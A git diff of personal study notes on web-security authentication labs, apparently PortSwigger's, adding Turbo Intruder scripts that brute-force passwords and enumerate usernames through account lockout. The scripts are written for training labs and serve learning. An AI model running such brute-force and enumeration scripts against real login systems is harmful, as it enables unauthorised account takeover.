@@ -54,13 +54,35 @@ https://www.youtube.com/watch?v=wxyAT0lFmuM
 https://www.youtube.com/watch?v=aPu6arKIdmE
 Now this one was interesting. It shows a way to use a faster (free) version of the normal intruder, that is miles more costomisable
 ```
-    for word in open(r"C:\Users\aayan\Downloads\auth-lab-passwords.txt"):
-        engine.queue(target.req, ["carlos", word.rstrip()])
-        
-        engine.queue(target.req, ["wiener", "peter"])
+for word in open(r"C:\Users\aayan\Downloads\auth-lab-passwords.txt"):
+    engine.queue(target.req, ["carlos", word.rstrip()])
+    
+    engine.queue(target.req, ["wiener", "peter"])
 ```
 
 
+
+Lab: Username enumeration via account lock
+So first i used Script 1 and found one that lead to an account lock. Then in Script 2, i first locked the account then brute forced the passwords and checked for the anomalous result
+```Script1
+for word in open(r"C:\Users\aayan\Documents\Burp\auth-lab-username.txt"):
+        engine.queue(target.req, [word.rstrip(), "01"])
+        engine.queue(target.req, [word.rstrip(), "02"])
+        engine.queue(target.req, [word.rstrip(), "03"])
+        engine.queue(target.req, [word.rstrip(), "04"])
+        engine.queue(target.req, [word.rstrip(), "05"])
+```
+
+```Script2
+engine.queue(target.req, ["aq", "01"])
+engine.queue(target.req, ["aq", "02"])
+engine.queue(target.req, ["aq", "03"])
+engine.queue(target.req, ["aq", "04"])
+engine.queue(target.req, ["aq", "05"])
+
+for word in open(r"C:\Users\aayan\Documents\Burp\auth-lab-passwords.txt"):
+    engine.queue(target.req, ["aq",word.rstrip()])
+```
 
 
 
